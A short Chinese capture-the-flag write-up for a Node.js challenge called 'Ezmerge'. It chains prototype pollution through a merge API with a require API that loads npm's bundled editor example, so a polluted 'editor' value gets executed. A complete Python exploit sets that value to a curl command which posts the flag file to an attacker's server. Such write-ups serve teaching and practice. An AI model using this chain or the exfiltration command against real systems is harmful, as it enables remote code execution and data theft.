# Ezmerge wp

阅读index.js,发现merge api,与require api

merge api 明显可用于原型链污染，但此题无法模板注入。所以想rce还需要配合其他方法。

require api用于加载node任意模块，是否有一个模块，只要加载便可以rce呢？分析源码或网络搜索。可以发现`/usr/local/lib/node_modules/npm/node_modules/editor/example/edit.js`中

```js
var editor = require('../');
editor(__dirname + '/beep.json', function (code, sig) {
    console.log('finished editing with code ' + code);
});

```

自动包含了其上一模块。

```js
var spawn = require('child_process').spawn;

module.exports = function (file, opts, cb) {
    if (typeof opts === 'function') {
        cb = opts;
        opts = {};
    }
    if (!opts) opts = {};
    
    var ed = /^win/.test(process.platform) ? 'notepad' : 'vim';
    var editor = opts.editor || process.env.VISUAL || process.env.EDITOR || ed;
    var args = editor.split(/\s+/);
    var bin = args.shift();
    
    var ps = spawn(bin, args.concat([ file ]), { stdio: 'inherit' });
    
    ps.on('exit', function (code, sig) {
        if (typeof cb === 'function') cb(code, sig)
    });
};

```

其中将`opts.editor`作为命令执行。与原型链污染配合，可以rce。

完整payload

```python
import requests
url="http://127.0.0.1:3000"
json={
    "merge1":{"1":"a"},
    "merge2": {
        "__proto__": {
            "editor": "curl -d @/flag vps" 
        }
    }
}
print(requests.post(url+'/api/merge',json=json).text)
print(requests.post(url+'/api/require',data={'requirethis':'/usr/local/lib/node_modules/npm/node_modules/editor/example/edit.js'}).text)
```

